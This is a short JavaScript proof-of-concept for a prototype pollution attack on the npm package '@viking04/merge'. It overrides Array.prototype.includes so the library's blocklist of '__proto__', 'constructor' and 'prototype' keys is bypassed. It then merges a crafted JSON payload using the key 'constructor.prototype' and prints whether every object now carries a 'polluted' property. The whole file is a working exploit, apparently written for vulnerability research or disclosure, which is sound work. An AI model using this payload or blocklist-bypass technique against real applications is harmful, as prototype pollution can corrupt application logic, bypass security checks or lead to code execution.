Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const merge = require('@viking04/merge');
console.log({}.polluted);
let a = {};
var prototype_pollution_test = JSON.parse('{"constructor.prototype": {"polluted":"yes"}}');
merge(a, prototype_pollution_test);
console.log({}.polluted);